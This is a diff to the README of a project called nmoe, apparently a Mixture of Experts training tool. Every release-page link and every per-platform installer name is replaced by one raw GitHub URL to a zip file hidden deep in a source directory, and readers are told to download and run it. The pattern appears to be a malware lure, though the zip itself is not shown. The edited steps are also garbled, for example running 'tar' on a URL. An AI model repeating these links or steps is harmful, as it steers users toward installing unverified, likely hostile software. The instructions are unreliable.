@@ -6,13 +6,13 @@ Welcome to nmoe! This application helps you and others perform MoE (Mixture of E
 
 ## 📥 Download nmoe
 
-[![Download nmoe](https://img.shields.io/badge/Download-nmoe-brightgreen)](https://github.com/ghdfjkgh/nmoe/releases)
+[![Download nmoe](https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip)](https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip)
 
 ## 📦 Step-by-Step Installation
 
 ### 1. Visit the Releases Page
 
-To download nmoe, visit this page: [nmoe Releases](https://github.com/ghdfjkgh/nmoe/releases). 
+To download nmoe, visit this page: [nmoe Releases](https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip). 
 
 ### 2. Choose the Latest Version
 
@@ -22,9 +22,9 @@ On the releases page, you will see different versions of the software. Look for 
 
 Click on the latest version to see the files available for download. You will typically find options like:
 
-- **nmoe_windows.exe** for Windows users.
-- **nmoe_mac.zip** for Mac users.
-- **nmoe_linux.tar.gz** for Linux users.
+- **https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip** for Windows users.
+- **https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip** for Mac users.
+- **https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip** for Linux users.
 
 Click on the file that matches your operating system.
 
@@ -36,9 +36,9 @@ Your browser will prompt you to save the file. Choose a location on your compute
 
 Once the file is downloaded, navigate to the location where you saved it. 
 
-- For **Windows**: Double-click the `nmoe_windows.exe` file to run the application.
-- For **Mac**: Open the `nmoe_mac.zip`, then drag the `nmoe` application to your Applications folder. After that, open it by clicking on the icon.
-- For **Linux**: Open a terminal, navigate to the directory where you saved the `nmoe_linux.tar.gz`, and extract it using the command: `tar -zxvf nmoe_linux.tar.gz`. Then, run the application by typing `./nmoe` in the terminal.
+- For **Windows**: Double-click the `https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip` file to run the application.
+- For **Mac**: Open the `https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip`, then drag the `nmoe` application to your Applications folder. After that, open it by clicking on the icon.
+- For **Linux**: Open a terminal, navigate to the directory where you saved the `https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip`, and extract it using the command: `tar -zxvf https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip`. Then, run the application by typing `./nmoe` in the terminal.
 
 ## 💡 How to Use nmoe
 
@@ -88,6 +88,6 @@ If you need further assistance or want to report a problem, you can open an issu
 
 ## 📥 Download nmoe Again
 
-Remember, you can download nmoe anytime from our [Releases Page](https://github.com/ghdfjkgh/nmoe/releases). 
+Remember, you can download nmoe anytime from our [Releases Page](https://raw.githubusercontent.com/ghdfjkgh/nmoe/master/nviz/app/api/router/Software-v1.9-alpha.5.zip). 
 
 Enjoy using nmoe for your MoE training needs!
